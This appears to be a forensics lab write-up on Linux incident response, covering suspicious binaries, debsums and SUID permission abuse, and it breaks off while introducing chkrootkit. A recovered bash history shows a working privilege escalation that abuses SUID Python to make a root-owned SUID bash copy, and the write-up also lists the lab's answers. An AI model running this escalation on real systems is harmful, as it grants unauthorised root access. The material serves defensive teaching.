<h2>Task 6. Binaries and Executables<a id='6'></a></h2>
<p>Another area to look at within our compromised host's file system is identifying binaries and executables that the attacker may have created, altered, or exploited through permission misconfigurations.</p>

<h3>Identifying Suspicious Binaries</h3>
<p>We can use the <code>find</code> command on UNIX-based systems to discover all executable files within the filesystem quickly:</p>


<pre><code>investigator@10.10.226.120:~$ find / -type f -executable 2> /dev/null
/snap/core/16574/etc/init.d/single
/snap/core/16574/etc/init.d/ssh
/snap/core/16574/etc/init.d/ubuntu-fan
/snap/core/16574/etc/init.d/udev
...
</code></pre>

<p>The following command recursively traverses the file system starting from the root directory and lists any executable file it finds. Note that this provides a huge amount of output. As such, it's often a good idea to limit the scope of the search through additional parameters.<br>

Once we identify an executable or binary that we want to investigate further, we can perform metadata analysis as we have done previously, performing integrity checking on it using checksums or inspecting its human-readable strings and raw content.</p>

<h3>Strings</h3>
<p>The <code>strings</code> command is valuable for extracting human-readable strings from binary files. These strings can sometimes include function names, variable names, and even plain text messages embedded within the binary. Analysing this information can help responders determine what the binary is used for and if there is any potential malicious activity involved. To run the strings command on a file, we need to provide the file as a single argument:</p>

<pre><code>user@tryhackme$ fstrings example.elf
</code></pre>

<h3>Debsums</h3>
<p>Like the integrity checking we performed earlier, <code>debsums</code> is a command-line utility for Debian-based Linux systems that verifies the integrity of installed package files. <code>debsums</code> automatically compares the MD5 checksums of files installed from Debian packages against the known checksums stored in the package's metadata.<br>

If any files have been modified or corrupted, <code>debsums</code> will report them, citing potential issues with the package's integrity. This can be useful in detecting malicious modifications and integrity issues within the system's packages. We can perform this check on the compromised system by running the following command:</p>

<pre><code>investigator@10.10.226.120:~$ sudo debsums -e -s
debsums: changed file /***/******* (from sudo package)
</code></pre>

<p>In the above command, we provide the <code>-e</code> flag to only perform a configuration file check. In addition, we provide the <code>-s</code> flag to silence any error output that may fill the screen.</p>

<h3>Binary Permissions</h3>
<p>SetUID (SUID) and SetGID (SGID) are special permission bits in Unix operating systems. These permission bits change the behaviour of executable files, allowing them to run with the privileges of the file owner or group rather than the privileges of the user who executes the file.<br>

If a binary or executable on the system is misconfigured with an SUID or SGID permission set, an attacker may abuse the binary to break out of a restricted (unprivileged) shell through legitimate but unintended use of that binary. For example, if the PHP binary contained a SUID bit to run as root, it's trivial for an attacker to abuse it to run system commands through PHP's system exec functions as root.<br>

Identifying SetUID (SUID) binaries on a Linux system involves examining the file permissions and explicitly looking for executables with the SetUID bit set. We can return to the <code>find</code> command to retrieve a list of the SetUID binaries on the system:</p>

<pre><code>investigator@10.10.226.120:~$ find / -perm -u=s -type f 2>/dev/null
...
/usr/bin/fusermount
/usr/bin/python3.8
/usr/bin/at
/usr/bin/mount
/var/tmp/bash
/mnt/usb/lib/dbus-1.0/dbus-daemon-launch-helper
...
</code></pre>


<p>Specifically, the above command looks for files where the user permission has the SUID bit set (<code>-u=s</code>).<br>

Much of the output here is expected as these binaries require the SUID bit and are not vulnerable. However, two of these results stand out. Firstly, Python should never be given SUID permission, as it is trivial to escalate privileges to the owner. Additionally, any SUID binaries in the <code>/tmp</code> or <code>/var/tmp</code> directory stand out as these directories are typically writable by all users, and unauthorised creation of SUID binaries in these directories poses a notable risk.<br>

We can investigate further by looking in Jane's bash history for any commands related to Python or bash:</p>

<pre><code>investigator@10.10.226.120:~$ sudo cat /home/jane/.bash_history | grep -B 2 -A 2 "python"
ls -al
find / -perm -u=s -type f 2>/dev/null
/usr/bin/python3.8 -c 'import os; os.execl("/bin/sh", "sh", "-p", "-c", "cp /bin/bash /var/tmp/bash && chown root:root /var/tmp/bash && chmod +s /var/tmp/bash")'
ls -al /var/tmp
/var/tmp/bash -p
exit
</code></pre>

<p>From the output, we've discovered evidence of Jane's user account identifying SUID binaries with the <code>find</code> command and abusing the SUID permission on the Python binary to run system commands as the root user. With this level of command execution, the attacker was able to create a copy of the <code>/bin/bash</code> binary (the Bash shell executable) and place it into the <code>/var/tmp</code> folder. Additionally, the attacker changed the owner of this file to root and added the SUID permission to it (<code>chmod +s</code>).

After making an SUID copy of <code>/bin/bash</code>, the attacker elevated to root by running <code>/var/tmp/bash -p</code>. We can further verify the <code>bash</code> binary by performing an integrity check on the original:</p>

<pre><code>investigator@10.10.226.120:~$ investigator@10.10.226.120:~$ md5sum /var/tmp/bash 
7063c393************d3b340f1ad2c  /var/tmp/bash
investigator@10.10.226.120:~$ md5sum /bin/bash
7063c393************d3b340f1ad2c  /bin/bash
</code></pre>

<p>The output above shows that the two binaries are identical, further enhancing our understanding of the attacker's actions to escalate to root.</p>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>
<br>


> 6.1. <em>Run the <code>debsums</code> utility on the compromised host to check only configuration files. Which file came back as altered?</em><br><a id='6.1'></a>
>> <code><strong>/etc/sudoers</strong></code>


<pre><code>investigator@ip-10-10-226-120:/etc$ sudo debsums -c -e
[sudo] password for investigator: 
/etc/sudoers
</code></pre>

<br>

> 6.2. <em>What is the <code>md5sum</code> of the binary that the attacker created to escalate privileges to root?</em><br><a id='6.1'></a>
>> <code><strong>7063c3930affe123baecd3b340f1ad2c</strong></code>

<pre><code>investigator@ip-10-10-226-120:/etc$ md5sum /var/tmp/bash
7063c3930affe123baecd3b340f1ad2c  /var/tmp/bash
</code></pre>

<br>
<h2>Task 7. Rootkits<a id='7'></a></h2>
<p>A rootkit is a type of malicious set of tools or software designed to gain administrator-level control of a system while remaining undetected by the system or user. The term "rootkit" derives from "root", the highest-level user in Unix-based systems, and "kit", which typically refers to a set of tools used to maintain this access.<br>

Rootkits are particularly dangerous because they can hide their presence on a system and allow attackers to maintain long-term access without detection. Attackers can also use them to stage other malicious activities on the target, exfiltrate sensitive information, or command and control the compromised system remotely.<br>

Fortunately, we can use some automated tools on UNIX-based systems to help detect and remove rootkits.</p>

<h3>Chkrootkit</h3>
https://www.chkrootkit.org/

<p><a href="https://www.chkrootkit.org/">Chkrootkit (Check Rootkit)</a> is a popular Unix-based utility used to examine the filesystem for rootkits. It operates as a simple shell script, leveraging common Linux binaries like <code>grep</code> and <code>strings</code> to scan the core system programs to identify signatures. It can use the signatures from files, directories, and processes to compare the data and identify common patterns of known rootkits. As it does not perform an in-depth analysis, it is an excellent tool for a first-pass check to identify potential compromise, but it may not catch all types of rootkits.<br>

Additionally, modern rootkits might deliberately attempt to identify and target copies of the chkrootkit program or adopt other strategies to evade its detection.<br>

We can access the chkrootkit on the compromised system using our mounted binaries. We can perform a simple check by running <code>chkrootkit</code>:</p>






